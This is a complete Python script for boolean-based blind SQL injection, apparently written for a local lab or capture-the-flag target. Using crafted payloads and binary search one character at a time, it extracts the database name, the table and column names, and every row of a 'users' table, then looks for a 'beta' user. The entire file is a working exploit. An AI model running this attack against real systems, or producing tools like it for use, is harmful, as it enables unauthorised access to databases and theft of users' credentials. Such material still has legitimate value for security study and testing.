import requests
import string
import time

# Target configuration
URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

# Baseline response for comparison
BASELINE = "You are connected successfully!<br/> No results"

def test_query(payload):
    """Test a SQL injection payload and return True if condition is true"""
    data = {"username": payload}
    try:
        response = requests.post(URL, data=data, cookies=COOKIES, timeout=10)
        # True condition will give different response than baseline
        return response.text != BASELINE and "You are connected successfully" in response.text
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False

def binary_search_char(query_template, position):
    """Use binary search to find a character at given position"""
    # ASCII printable range: 32-126
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        # Test if character is greater than mid
        payload = f"' AND ASCII(SUBSTRING(({query_template}),{position},1))>{mid}-- "
        
        if test_query(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    # Verify the character we found
    if low <= 126:
        payload = f"' AND ASCII(SUBSTRING(({query_template}),{position},1))={low}-- "
        if test_query(payload):
            return chr(low)
    
    return None

def extract_string(query_template, max_length=50):
    """Extract a complete string using binary search"""
    result = ""
    
    for position in range(1, max_length + 1):
        char = binary_search_char(query_template, position)
        
        if char is None or ord(char) < 32:
            break
        
        result += char
        print(f"[+] Position {position}: '{char}' - Current: '{result}'")
    
    return result

def get_string_length(query_template, max_length=100):
    """Get the length of a string result"""
    for length in range(1, max_length + 1):
        payload = f"' AND LENGTH(({query_template}))={length}-- "
        if test_query(payload):
            return length
    return 0

print("=" * 80)
print("BOOLEAN-BASED BLIND SQL INJECTION")
print("=" * 80)

# Test basic injection
print("\n[*] Testing basic SQL injection...")
test_payload = "' OR '1'='1'-- "
if test_query(test_payload):
    print("[+] SQL injection confirmed! Response differs from baseline.")
else:
    print("[-] Basic injection test failed")

# Step 1: Extract database name
print("\n" + "=" * 80)
print("STEP 1: EXTRACTING DATABASE NAME")
print("=" * 80)

db_length = get_string_length("SELECT database()")
print(f"\n[+] Database name length: {db_length}")

if db_length > 0:
    print(f"[*] Extracting database name ({db_length} characters)...")
    database_name = extract_string("SELECT database()", db_length)
    print(f"\n[SUCCESS] Database name: {database_name}")
else:
    print("[-] Failed to determine database name length")
    database_name = extract_string("SELECT database()", 20)
    print(f"\n[*] Database name (extracted): {database_name}")

# Step 2: Extract table names
print("\n" + "=" * 80)
print("STEP 2: EXTRACTING TABLE NAMES")
print("=" * 80)

# First, count tables
print("\n[*] Counting tables in database...")
for num_tables in range(1, 20):
    payload = f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database_name}')={num_tables}-- "
    if test_query(payload):
        print(f"[+] Number of tables: {num_tables}")
        break

# Extract each table name
tables = []
for table_index in range(num_tables):
    print(f"\n[*] Extracting table {table_index + 1}/{num_tables}...")
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {table_index},1"
    
    table_length = get_string_length(query)
    print(f"[+] Table name length: {table_length}")
    
    if table_length > 0:
        table_name = extract_string(query, table_length)
        tables.append(table_name)
        print(f"[SUCCESS] Table {table_index + 1}: {table_name}")

print(f"\n[+] Found tables: {tables}")

# Step 3: Extract columns from 'users' table
print("\n" + "=" * 80)
print("STEP 3: EXTRACTING COLUMNS FROM 'users' TABLE")
print("=" * 80)

if 'users' in tables:
    # Count columns
    print("\n[*] Counting columns in 'users' table...")
    for num_cols in range(1, 20):
        payload = f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='users')={num_cols}-- "
        if test_query(payload):
            print(f"[+] Number of columns: {num_cols}")
            break
    
    # Extract column names
    columns = []
    for col_index in range(num_cols):
        print(f"\n[*] Extracting column {col_index + 1}/{num_cols}...")
        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='users' LIMIT {col_index},1"
        
        col_length = get_string_length(query)
        print(f"[+] Column name length: {col_length}")
        
        if col_length > 0:
            col_name = extract_string(query, col_length)
            columns.append(col_name)
            print(f"[SUCCESS] Column {col_index + 1}: {col_name}")
    
    print(f"\n[+] Found columns: {columns}")
else:
    print("[-] 'users' table not found in database")
    columns = []

# Step 4: Extract data from users table
print("\n" + "=" * 80)
print("STEP 4: EXTRACTING DATA FROM 'users' TABLE")
print("=" * 80)

if columns:
    # Count rows
    print("\n[*] Counting rows in 'users' table...")
    for num_rows in range(1, 50):
        payload = f"' AND (SELECT COUNT(*) FROM users)={num_rows}-- "
        if test_query(payload):
            print(f"[+] Number of rows: {num_rows}")
            break
    
    # Extract data from each row
    users_data = []
    for row_index in range(num_rows):
        print(f"\n[*] Extracting row {row_index + 1}/{num_rows}...")
        row_data = {}
        
        # Extract each column value
        for col in columns:
            query = f"SELECT {col} FROM users LIMIT {row_index},1"
            
            # Get length first
            length = get_string_length(query, 100)
            print(f"[+] {col} length: {length}")
            
            if length > 0:
                value = extract_string(query, length)
                row_data[col] = value
                print(f"[SUCCESS] {col}: {value}")
            else:
                row_data[col] = ""
        
        users_data.append(row_data)
        print(f"\n[ROW {row_index + 1}] {row_data}")

    # Step 5: Look for beta user
    print("\n" + "=" * 80)
    print("STEP 5: SEARCHING FOR 'beta' RELATED USER")
    print("=" * 80)
    
    beta_found = False
    for idx, user in enumerate(users_data):
        for key, value in user.items():
            if 'beta' in value.lower():
                print(f"\n[!] FOUND 'beta' in row {idx + 1}:")
                print(f"[!] {key}: {value}")
                print(f"[!] Full row: {user}")
                beta_found = True
    
    if not beta_found:
        print("\n[-] No 'beta' related user found in extracted data")
    
    # Print summary
    print("\n" + "=" * 80)
    print("EXTRACTION SUMMARY")
    print("=" * 80)
    print(f"\nDatabase: {database_name}")
    print(f"Tables: {tables}")
    print(f"Columns in 'users': {columns}")
    print(f"\nAll extracted users:")
    for idx, user in enumerate(users_data):
        print(f"\nUser {idx + 1}:")
        for key, value in user.items():
            print(f"  {key}: {value}")

print("\n[*] Blind SQL injection extraction complete!")

